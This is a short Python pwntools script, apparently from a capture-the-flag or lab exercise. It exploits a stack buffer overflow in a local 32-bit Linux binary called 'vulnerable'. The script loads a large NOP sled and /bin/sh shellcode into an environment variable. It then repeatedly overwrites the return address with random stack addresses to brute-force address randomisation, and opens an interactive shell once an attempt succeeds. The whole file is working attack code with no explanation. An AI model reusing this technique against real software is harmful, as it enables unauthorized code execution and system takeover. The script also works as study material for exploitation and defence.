#!/usr/bin/env python
from pwn import *
import random

# 32 bit linux
context(arch='i386', os='linux')

# Generate vars
nopsled = "\x90" * 110000
sc = asm(shellcraft.sh())
ret_offset = 16

while True:
	
	target = 0xff000000 + random.getrandbits(24)
	print hex(target)

	# Generate process, with SHELLCODE env var
	p = process('./vulnerable', env={ 'SHELLCODE' : nopsled + sc })

	# Craft payload
	payload = "A" * ret_offset
	payload += p32(target)
	
	try:
		# Send payload
		p.sendline(payload)
		p.recv(timeout=1)
		p.interactive()
		break
	except EOFError as e:
		print e.args
		p.terminate()
		p.wait()
		p.close()
